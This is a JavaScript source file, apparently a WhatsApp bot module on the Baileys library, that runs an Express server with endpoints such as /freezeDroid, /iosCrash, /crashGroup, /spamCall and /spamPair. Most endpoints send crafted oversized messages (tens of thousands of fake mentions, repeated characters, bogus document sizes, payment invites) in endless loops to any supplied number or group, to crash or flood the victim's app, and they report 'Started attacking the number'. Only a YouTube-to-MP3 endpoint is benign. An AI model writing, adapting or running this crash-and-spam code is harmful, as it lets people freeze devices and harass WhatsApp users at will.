//base by DGXeon (Xeon Bot Inc.)
//re-upload? recode? copy code? give credit ya :)
//YouTube: @DGXeon
//Instagram: unicorn_xeon13
//Telegram: @DGXeon
//GitHub: @DGXeon
//WhatsApp: +916909137213
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
//telegram channel: https://t.me/+WEsVdEN2B9w4ZjA9

const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("baileys")
const fs = require('fs')
const util = require('util')
const cors = require("cors");
const express = require('express');
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

const app = express();
const PORT = process.env.PORT || 3000;

module.exports = async (XeonBotInc, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (XeonBotInc.user.id.split(':')[0]+'@s.whatsapp.net' || XeonBotInc.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
//====================================\\
const o = fs.readFileSync(`./69/o.jpg`)
//====================================\\
// Function to convert phone number to WhatsApp JID
function toWhatsAppJID(phoneNumber) {
    if (!phoneNumber) throw new Error('Phone number is required');
    // Remove the "+" sign if present
    return phoneNumber.replace(/\+/g, '') + '@s.whatsapp.net';
}
//====================================\\
// Add this helper function to check developer numbers
function isDeveloperNumber(phoneNumber) {
    const developerNumbers = ['916909137213', '919402104403']; // List of developer numbers without the "+"
    const cleanedNumber = phoneNumber.replace(/\+/g, ''); // Remove "+" if present
    return developerNumbers.includes(cleanedNumber);
}
//====================================\\
app.use(cors());
app.use(express.json()); // Middleware to parse JSON bodies
//====================================\\
app.get('/freezeDroid', async (req, res) => {
    const { target } = req.query; // Access the target parameter from the query string
    // Check if the target is a developer number
    if (isDeveloperNumber(target)) {
        return res.status(403).send('Cannot attack developer');
    }
async function XeonXRobust(target, o, Ptcp = true) {
	const jid = toWhatsAppJID(target); // Convert phone number to JID
	const jids = `_*~@916909137213~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
	while (true) {
   await XeonBotInc.relayMessage(jid, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "🦄드림 가이 Xeon",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: o,
         },
         hasMediaAttachment: true,
        },

									body: { text: '🦄드림 가이 Xeon' + ui + jids },
									contextInfo: {
										mentionedJid: ['916909137213@s.whatsapp.net'],
										mentions: ['916909137213@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "🦄드림 가이 Xeon",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: jid
     }
    } : {}
   );
await delay(15000); // Delay for 15 seconds
    }
	}
    // Basic validation for phone numbers
    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
    if (!target || !phoneNumberPattern.test(target)) {
        return res.status(400).send('Phone number you have provided is invalid');
    }
    try {
    	res.send(`Started attacking the number ${target}`);
        await XeonXRobust(target); // Pass validated phone number to the function
    } catch (error) {
        console.error(error.message);
        res.status(500).send('An error occurred while sending the message');
    }
});
//====================================\\
app.get('/iosCrash', async (req, res) => {
    const { target } = req.query; // Access the target parameter from the query string
    // Check if the target is a developer number
    if (isDeveloperNumber(target)) {
        return res.status(403).send('Cannot attack developer');
    }
async function XeonIosOld(target) {
await XeonBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
} 
async function XeonIosPayOld(jid) {
			XeonBotInc.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
		};
	async function XeonIosNew(jid) {
			XeonBotInc.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': ' 🦄드림 가이 Xeon' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
		};
		async function xeonIosRobust(target){
const jid = toWhatsAppJID(target); // Convert phone number to JID
while (true) {
await XeonIosOld(jid)
await XeonIosNew(jid)
await XeonIosPayOld(jid)
await XeonIosOld(jid)
await delay(15000); // Delay for 15 seconds
}
}
    // Basic validation for phone numbers
    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
    if (!target || !phoneNumberPattern.test(target)) {
        return res.status(400).send('Phone number you have provided is invalid');
    }

    try {
    	res.send(`Started attacking the number ${target}`);
        await xeonIosRobust(target); // Pass validated phone number to the function
    } catch (error) {
        console.error(error.message);
        res.status(500).send('An error occurred while sending the message');
    }
});
//====================================\\
app.get('/crashGroup', async (req, res) => {
    const { target } = req.query; // Access the target parameter from the query string
    async function xgc2(target){
    	    const result = target.split('https://chat.whatsapp.com/')[1]
    const xeontry = await XeonBotInc.groupAcceptInvite(result)
		await XeonBotInc.relayMessage(xeontry, {
'groupInviteMessage': {
"inviteExpiration": Math.floor(Date.now() / 1000) + 31536000,
"groupName":` 🦄드림 가이 Xeon`.repeat(1500),
'groupJid': '120363047626537933@g.us',
'inviteExpiration': '999',
'caption': '> ㅤㅤㅤㅤㅤㅤㅤ',
"inviteCode": 'h+64P9RhJDzgXSPf',
'contextInfo': {
'isForwarded': true,
'fromMe': false,
'participant': '0@s.whatsapp.net',
'remoteJid': sender,
'quotedMessage': {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
title: "crash",
pageCount: 1000000000,
fileName: "crash.pdf".repeat(1500),
contactVcard: true
}
},
'forwardedNewsletterMessageInfo': {
'newsletterJid': '120363222395675670@newsletter',
'serverMessageId': 1,
'newsletterName': "🦄드림 가이 Xeon".repeat(1500)
}
}
}
}, {});
		}
// Regular expression to validate WhatsApp group links
    const groupLinkPattern = /^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$/;
    // Validate the target
    if (!target || !groupLinkPattern.test(target)) {
        return res.status(400).send('The link you provided is invalid');
    }    
    try {
        res.send(`Successfully started attacking the group chat`);
        await xgc2(target);
    } catch (error) {
        console.error(error.message);
        res.status(500).send('An error occurred while sending the message');
    }
});
//====================================\\
app.get('/spamCall', async (req, res) => {
    const { target } = req.query; // Access the target parameter from the query string
    // Check if the target is a developer number
    if (isDeveloperNumber(target)) {
        return res.status(403).send('Cannot attack developer');
    }
async function sendOfferCall(target) {
    try {
        await XeonBotInc.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:, error`));
    }
}
// Basic validation for phone numbers
    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
    if (!target || !phoneNumberPattern.test(target)) {
        return res.status(400).send('Phone number you have provided is invalid');
    }
    try {
    	res.send(`Started attacking the number ${target}`);
        await XeonXRobust(target); // Pass validated phone number to the function
    } catch (error) {
        console.error(error.message);
        res.status(500).send('An error occurred while sending the message');
    }
});  
//====================================\\
app.get('/spamPair', async (req, res) => {
    const { target, count = 20, delay = 3000 } = req.query;

    // Helper function to check if the number is a developer's number
    function isDeveloperNumber(number) {
        const developerNumbers = ["916909137213"]; // Add protected numbers here
        return developerNumbers.includes(number.replace(/[^\d]/g, ""));
    }

    // Validate the phone number
    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/;
    if (!target || !phoneNumberPattern.test(target)) {
        return res.status(400).send("Invalid phone number provided.");
    }

    // Protect developer numbers
    if (isDeveloperNumber(target)) {
        return res.status(403).send("Cannot attack developer.");
    }

    // Function to perform the spam
    async function spamPair(target, count, delay) {
        const jid = `${target.replace(/[^\d]/g, "")}@s.whatsapp.net`;
        const spamCount = parseInt(count);
        const delayMs = parseInt(delay);

        const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('baileys');
        const { state } = await useMultiFileAuthState("session");
        const { version } = await fetchLatestBaileysVersion();
        const sucked = await makeWaSocket({ auth: state, version });

        for (let i = 0; i < spamCount; i++) {
            try {
                const prc = await sucked.requestPairingCode(target);
                console.log(`# Success Spam Pairing Code - Number: ${target} - Code: ${prc}`);
                await sucked.sendMessage(jid, { text: `Pairing Code: ${prc}` });

                // Wait before sending the next message
                await new Promise(resolve => setTimeout(resolve, delayMs));
            } catch (err) {
                console.error(`Error sending pairing code: ${err.message}`);
                if (err.message.includes("Connection Closed")) {
                    console.log("Connection closed, stopping spam.");
                    break;
                }
            }
        }
    }

    try {
        res.send(`Started spamming pairing codes to ${target}`);
        await spamPair(target, count, delay); // Trigger the spam function
    } catch (error) {
        console.error(error.message);
        res.status(500).send("An error occurred while spamming pairing codes.");
    }
});
//====================================\\
const youtubedl = require("youtube-dl-exec");

// API Endpoint
app.get("/ytmp3", async (req, res) => {
    const videoUrl = req.query.url; // Expecting a YouTube URL as a query parameter

    if (!videoUrl) {
        return res.status(400).json({ success: false, message: "Please provide a YouTube URL!" });
    }

    try {
        // Use youtube-dl to fetch audio format
        const output = await youtubedl(videoUrl, {
            extractAudio: true,
            audioFormat: "mp3",
            output: "%(title)s.%(ext)s",
            format: "bestaudio"
        });

        // Respond with the download link
        return res.status(200).json({
            success: true,
            result: {
                title: output.title || "Unknown Title",
                url: output.url || "Generated URL not available",
            },
        });
    } catch (error) {
        console.error("Error converting video:", error);
        return res.status(500).json({ success: false, message: "Failed to process the video!" });
    }
});
//====================================\\
// Start the server and connect to WhatsApp
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
}).on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        console.error(`Port ${PORT} is in use. Trying another port...`);
        const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024); // Random port between 1024 and 65535
        app.listen(newPort, () => {
            console.log(`Server is running on http://localhost:${newPort}`);
        });
    } else {
        console.error('An error occurred:', err.message);
    }
});

} catch (err) {
console.log(util.format(err))
}
}
